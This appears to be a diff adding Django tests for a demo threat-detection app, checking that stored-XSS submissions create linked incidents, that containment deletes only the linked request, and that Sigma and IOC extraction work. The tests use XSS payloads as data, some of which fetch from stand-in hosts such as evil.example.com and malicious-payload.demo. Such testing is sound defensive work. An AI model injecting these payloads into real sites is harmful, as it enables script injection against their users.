@@ -510,3 +510,292 @@ class AutomaticThreatDetectionTestCase(TestCase):
         # Forensic evidence remains retained on incident
         self.assertIn("surveillance_vector", incident.payload)
 
+
+
+# ---------------------------------------------------------------------------
+# Spec Section 25 — additional tests
+# ---------------------------------------------------------------------------
+
+class ExactLinkingTestCase(TestCase):
+    """
+    Tests that SecurityEvent / SecurityIncident link to the exact SurveillanceRequest
+    primary key and that no fuzzy payload lookup is used.
+    """
+
+    def setUp(self):
+        self.client = Client()
+        self.admin = SpyUser.objects.create(
+            player_id=7001,
+            player_name="LinkAnalyst",
+            api_key="link_key",
+            is_admin=True,
+        )
+        session = self.client.session
+        session["spy_user_id"] = self.admin.id
+        session.save()
+
+    def test_incident_links_exact_surveillance_request_pk(self):
+        """
+        After submitting a malicious faction_id through create_request,
+        the resulting incident must reference the exact SurveillanceRequest PK.
+        """
+        malicious = "<img src=x onerror=fetch('http://evil.example.com')>"
+        self.client.post(reverse("create_request"), {"faction_id": malicious})
+
+        sr = SurveillanceRequest.objects.filter(faction_id=malicious).first()
+        self.assertIsNotNone(sr, "SurveillanceRequest should have been created")
+
+        incident = SecurityIncident.objects.latest("created_at")
+        self.assertEqual(
+            incident.surveillance_request_id, sr.id,
+            "Incident must reference the exact SurveillanceRequest PK — no fuzzy match",
+        )
+
+    def test_unrelated_requests_remain_unrelated(self):
+        """
+        A legitimate request created independently must never be linked to an incident.
+        """
+        legit = SurveillanceRequest.objects.create(
+            user=self.admin, faction_id="99999", status="PENDING"
+        )
+
+        self.client.post(
+            reverse("xss_demo"),
+            {"directive": "<script>alert(1)</script>"},
+        )
+
+        incident = SecurityIncident.objects.latest("created_at")
+        # The incident must NOT reference the unrelated legitimate request
+        self.assertNotEqual(incident.surveillance_request_id, legit.id)
+
+    def test_no_fuzzy_payload_lookup_on_contain(self):
+        """
+        TAKE ACTION must only delete the exact linked SurveillanceRequest.
+        A second unrelated SurveillanceRequest with similar content must survive.
+        """
+        # Create an unrelated SR that happens to contain XSS-looking text
+        # (simulates a coincidental match that old fuzzy code would delete)
+        bystander = SurveillanceRequest.objects.create(
+            user=self.admin,
+            faction_id="<b>bold text not malicious</b>",
+            status="PENDING",
+        )
+
+        malicious = "<svg onload=alert('exact')>"
+        self.client.post(reverse("create_request"), {"faction_id": malicious})
+
+        incident = SecurityIncident.objects.latest("created_at")
+        linked_sr_id = incident.surveillance_request_id
+        self.assertIsNotNone(linked_sr_id)
+
+        # Contain
+        self.client.post(reverse("take_action", kwargs={"incident_id": incident.id}))
+
+        # Linked SR deleted
+        self.assertFalse(SurveillanceRequest.objects.filter(id=linked_sr_id).exists())
+        # Bystander MUST still exist
+        self.assertTrue(
+            SurveillanceRequest.objects.filter(id=bystander.id).exists(),
+            "Unrelated SurveillanceRequest must not be deleted by TAKE ACTION",
+        )
+
+
+class TakeActionExactnessTestCase(TestCase):
+    """Tests that TAKE ACTION is precise, idempotent, and forensically sound."""
+
+    def setUp(self):
+        self.client = Client()
+        self.admin = SpyUser.objects.create(
+            player_id=8001,
+            player_name="ActionAnalyst",
+            api_key="action_key",
+            is_admin=True,
+        )
+        session = self.client.session
+        session["spy_user_id"] = self.admin.id
+        session.save()
+
+    def _trigger_incident_via_create_request(self, payload_str):
+        self.client.post(reverse("create_request"), {"faction_id": payload_str})
+        return SecurityIncident.objects.latest("created_at")
+
+    def test_take_action_deletes_only_associated_request(self):
+        unrelated = SurveillanceRequest.objects.create(
+            user=self.admin, faction_id="12345", status="PENDING"
+        )
+        incident = self._trigger_incident_via_create_request(
+            "<script>malicious_unique_token</script>"
+        )
+        linked_id = incident.surveillance_request_id
+        self.assertIsNotNone(linked_id)
+
+        self.client.post(reverse("take_action", kwargs={"incident_id": incident.id}))
+
+        self.assertFalse(SurveillanceRequest.objects.filter(id=linked_id).exists())
+        self.assertTrue(SurveillanceRequest.objects.filter(id=unrelated.id).exists())
+
+    def test_take_action_is_idempotent(self):
+        incident = self._trigger_incident_via_create_request(
+            "<img onerror=x src=y>"
+        )
+        # First action
+        r1 = take_action_contain(incident.id, self.admin)
+        self.assertTrue(r1["success"])
+        self.assertFalse(r1.get("idempotent", False))
+
+        # Second action — must be idempotent
+        r2 = take_action_contain(incident.id, self.admin)
+        self.assertTrue(r2["success"])
+        self.assertTrue(r2.get("idempotent", False))
+
+    def test_incident_remains_after_take_action(self):
+        incident = self._trigger_incident_via_create_request(
+            "<iframe src=javascript:alert(1)></iframe>"
+        )
+        incident_id = incident.id
+        self.client.post(reverse("take_action", kwargs={"incident_id": incident_id}))
+
+        # Incident record must still exist with forensic payload
+        incident.refresh_from_db()
+        self.assertEqual(incident.status, "CONTAINED")
+        self.assertTrue(SecurityIncident.objects.filter(id=incident_id).exists())
+        self.assertIsNotNone(incident.payload)
+
+    def test_containment_verification_recorded(self):
+        incident = self._trigger_incident_via_create_request(
+            "<script>javascript:void(0)</script>"
+        )
+        self.client.post(reverse("take_action", kwargs={"incident_id": incident.id}))
+
+        incident.refresh_from_db()
+        self.assertTrue(incident.containment_verified)
+        self.assertIn("Containment: VERIFIED", incident.action_result)
+        self.assertIn("SurveillanceRequest", incident.action_result)
+
+
+class SigmaAccuracyTestCase(TestCase):
+    """Sigma rules must match only when the event actually fits the rule."""
+
+    def test_matching_event_returns_matched(self):
+        matches = evaluate_sigma_rules({
+            "event_type": "stored_xss_detected",
+            "method": "POST",
+            "path": "/dispatch/",
+        })
+        titles = [m["title"] for m in matches]
+        self.assertIn("Stored XSS Detection", titles)
+
+    def test_non_matching_event_returns_not_matched(self):
+        matches = evaluate_sigma_rules({
+            "event_type": "benign_form_submission",
+            "method": "GET",
+            "path": "/home/",
+        })
+        stored_xss_matches = [m for m in matches if m["title"] == "Stored XSS Detection"]
+        self.assertEqual(len(stored_xss_matches), 0)
+
+
+class IOCRealExtractionTestCase(TestCase):
+    """IOC extraction must produce only indicators actually present in the event."""
+
+    def test_ip_extracted_from_source_ip(self):
+        raw = [{"ioc_type": "IP", "value": "10.0.0.5"}]
+        deduped = normalize_and_deduplicate(raw)
+        self.assertEqual(len(deduped), 1)
+        self.assertEqual(deduped[0]["normalized_value"], "10.0.0.5")
+
+    def test_no_fabricated_iocs_for_benign_event(self):
+        iocs = extract_all_iocs({
+            "source_ip": "127.0.0.1",
+            "payload": "regular surveillance update",
+            "path": "/requests/create/",
+            "method": "POST",
+            "user_agent": "Mozilla/5.0",
+        })
+        # Should only find 127.0.0.1 as IP — no domains, URLs, or payload patterns
+        ioc_types = [i["ioc_type"] for i in iocs]
+        self.assertNotIn("PAYLOAD_PATTERN", ioc_types)
+        self.assertNotIn("URL", ioc_types)
+
+    def test_ioc_deduplication_prevents_duplicates(self):
+        raw = [
+            {"ioc_type": "IP", "value": "192.168.1.1"},
+            {"ioc_type": "IP", "value": "192.168.1.1"},
+            {"ioc_type": "IP", "value": " 192.168.1.1 "},
+        ]
+        deduped = normalize_and_deduplicate(raw)
+        self.assertEqual(len(deduped), 1)
+
+
+class EndToEndPipelineTestCase(TestCase):
+    """
+    Full end-to-end test: external crafted request → SurveillanceRequest →
+    automatic detection → SecurityEvent → IOC extraction → normalization →
+    enrichment → risk score → Sigma → SecurityIncident → SOC → TAKE ACTION →
+    exact SR deleted → containment verified.
+    """
+
+    def setUp(self):
+        self.client = Client()
+        self.admin = SpyUser.objects.create(
+            player_id=9001,
+            player_name="E2EAnalyst",
+            api_key="e2e_key",
+            is_admin=True,
+        )
+        session = self.client.session
+        session["spy_user_id"] = self.admin.id
+        session.save()
+
+    def test_full_pipeline(self):
+        # 1. No prior incidents
+        self.assertEqual(SecurityIncident.objects.count(), 0)
+
+        # 2. Operator submits crafted payload through normal application path
+        malicious = "<script>/* DEMO_VIDEO_PAYLOAD */ fetch('http://malicious-payload.demo/exploit.js');</script>"
+        self.client.post(reverse("create_request"), {"faction_id": malicious})
+
+        # 3. SurveillanceRequest created
+        sr = SurveillanceRequest.objects.filter(faction_id=malicious).first()
+        self.assertIsNotNone(sr)
+
+        # 4. Automatic detection fired → SecurityEvent created
+        self.assertEqual(SecurityEvent.objects.count(), 1)
+        event = SecurityEvent.objects.latest("created_at")
+        self.assertEqual(event.event_type, "stored_xss_detected")
+
+        # 5. IOC extraction ran — at least one IOC exists
+        self.assertGreater(IOC.objects.count(), 0)
+
+        # 6. SecurityIncident created and linked to exact SR
+        self.assertEqual(SecurityIncident.objects.count(), 1)
+        incident = SecurityIncident.objects.latest("created_at")
+        self.assertEqual(incident.status, "OPEN")
+        self.assertEqual(incident.surveillance_request_id, sr.id)
+        self.assertGreater(incident.risk_score, 0)
+        self.assertIsNotNone(incident.matched_sigma_rule)
+        self.assertEqual(incident.event_id, event.id)
+
+        # 7. SOC rendering state is compromised
+        state = verify_active_rendering_state()
+        self.assertTrue(state["is_compromised"])
+
+        # 8. TAKE ACTION
+        self.client.post(reverse("take_action", kwargs={"incident_id": incident.id}))
+
+        # 9. Exact SR deleted
+        self.assertFalse(SurveillanceRequest.objects.filter(id=sr.id).exists())
+
+        # 10. Containment verified
+        incident.refresh_from_db()
+        self.assertEqual(incident.status, "CONTAINED")
+        self.assertTrue(incident.containment_verified)
+
+        # 11. Forensic evidence remains
+        self.assertIsNotNone(incident.event)
+        self.assertIn("DEMO_VIDEO_PAYLOAD", incident.payload)
+        self.assertTrue(SecurityIncident.objects.filter(id=incident.id).exists())
+
+        # 12. SOC now clean
+        post_state = verify_active_rendering_state()
+        self.assertFalse(post_state["is_compromised"])
